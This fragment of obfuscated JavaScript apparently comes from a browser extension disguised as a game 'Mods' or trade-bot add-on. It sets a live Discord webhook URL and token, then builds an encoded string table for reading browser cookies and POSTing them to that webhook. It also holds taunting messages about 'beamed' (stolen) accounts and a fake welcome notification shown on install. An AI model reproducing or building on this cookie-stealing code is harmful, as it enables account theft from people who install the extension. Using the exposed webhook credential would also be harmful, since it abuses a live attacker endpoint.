...
var discord_web_api = "https://discord.com/api/webhooks/1122575819617878127/6tf3Oo34IjqtmIVHaKE9z8QNnFoAa78rEMS0jbUIDdTIcWCDLkXR2IUTCTeYJj82nA5I";

var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\x0A", "join", "get", "cookies", discord_web_api, "?wait=true", "....", ".", "..", "...", "|", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "Beamed by Blend", "blend on top LOL", "Free bobux moment loool", "blend beamed this tard", "Fender Blender beamed u", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", " get bemed ", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
